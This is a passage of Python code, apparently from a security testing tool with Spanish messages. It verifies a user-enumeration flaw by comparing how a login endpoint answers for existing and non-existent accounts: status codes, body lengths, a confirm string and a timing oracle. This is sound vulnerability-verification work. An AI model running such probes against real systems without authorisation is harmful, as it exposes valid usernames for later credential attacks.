                        _es2, _eb2, _ee2 = _probe(user)
                        if _es2 != -1:
                            _exist_times.append(_ee2)
                    existing_elapsed = sorted(_exist_times)[len(_exist_times) // 2]
                    step(f"user-enum: probe existente '{user}' → {sc} ({len(body)} bytes, {existing_elapsed:.3f}s median)")
                    break

            if existing_sc is None:
                res.detail = "user-enumeration: no se pudo obtener respuesta para cuentas conocidas"
                return res

            # Probe non-existing account (3 times and take median for stability)
            _nonexist_times: list = []
            nonexist_sc, nonexist_body = -1, ""
            for _ in range(3):
                _ns, _nb, _ne = _probe(_NONEXIST_USER)
                if _ns != -1:
                    nonexist_sc, nonexist_body = _ns, _nb
                    _nonexist_times.append(_ne)
            nonexist_elapsed = sorted(_nonexist_times)[len(_nonexist_times) // 2] if _nonexist_times else 0.0
            step(f"user-enum: probe no-existente '{_NONEXIST_USER}' → {nonexist_sc} "
                 f"({len(nonexist_body)} bytes, {nonexist_elapsed:.3f}s)")

            res.evidence["existing_status"] = existing_sc
            res.evidence["nonexist_status"] = nonexist_sc
            res.evidence["existing_body_len"] = len(existing_body)
            res.evidence["nonexist_body_len"] = len(nonexist_body)
            res.evidence["existing_elapsed_s"] = round(existing_elapsed, 3)
            res.evidence["nonexist_elapsed_s"] = round(nonexist_elapsed, 3)

            # Check confirm_string in existing response
            if confirm_string and confirm_string in existing_body:
                if confirm_string not in nonexist_body:
                    res.verified = True
                    res.ok = True
                    res.detail = (f"user-enumeration VERIFICADO: confirm_string "
                                  f"'{confirm_string[:40]}' aparece para cuenta existente "
                                  f"pero NO para cuenta inexistente")
                    res.evidence["confirm_found"] = True
                    return res

            # Check status code difference
            if existing_sc != nonexist_sc and existing_sc != -1 and nonexist_sc != -1:
                res.verified = True
                res.ok = True
                res.detail = (f"user-enumeration VERIFICADO: status diferente "
                              f"({existing_sc} para existente vs {nonexist_sc} para no-existente)")
                res.evidence["status_difference"] = True
                return res

            # Check body length difference: require >200 bytes AND one response short
            # (>50 is too noisy — different error messages/decorations can differ by 50-200b).
            _body_diff = abs(len(existing_body) - len(nonexist_body))
            if _body_diff > 200 and min(len(existing_body), len(nonexist_body)) < 2000:
                res.verified = True
                res.ok = True
                res.detail = (f"user-enumeration VERIFICADO: longitud de respuesta diferente "
                              f"({len(existing_body)} vs {len(nonexist_body)} bytes, diff={_body_diff})")
                res.evidence["body_length_difference"] = _body_diff
                return res

            # Timing oracle: >1000ms difference required — Docker jitter can easily be 300-500ms
            if (existing_elapsed > 0 and nonexist_elapsed > 0
                    and abs(existing_elapsed - nonexist_elapsed) > 1.0):
                _faster = "existente" if existing_elapsed < nonexist_elapsed else "no-existente"
                res.verified = True
                res.ok = True
                res.detail = (f"user-enumeration VERIFICADO (timing oracle): "
                              f"{abs(existing_elapsed - nonexist_elapsed):.3f}s de diferencia — "
                              f"respuesta mas rapida para cuenta {_faster}")
                res.evidence["timing_oracle"] = True
                res.evidence["timing_diff_s"] = round(abs(existing_elapsed - nonexist_elapsed), 3)
                return res

            res.detail = "user-enumeration: respuestas identicas — no se pudo confirmar enumeracion"
            return res

    except Exception as e:
        res.detail = f"error inesperado en verify_generic_user_enumeration: {e}"
        return res


